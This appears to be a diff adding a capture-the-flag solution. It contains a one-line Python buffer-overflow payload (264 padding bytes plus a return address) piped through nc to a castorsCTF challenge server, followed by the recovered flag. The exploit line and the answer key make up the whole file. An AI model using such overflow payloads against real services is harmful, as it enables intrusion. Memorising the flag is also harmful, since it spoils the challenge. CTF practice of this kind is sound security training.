@@ -1,0 +1,3 @@
+python -c 'print "A"*264 + "\xe7\x06\x40" + "\x00"*5' | nc chals20.cybercastors.com 14425
+
+castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
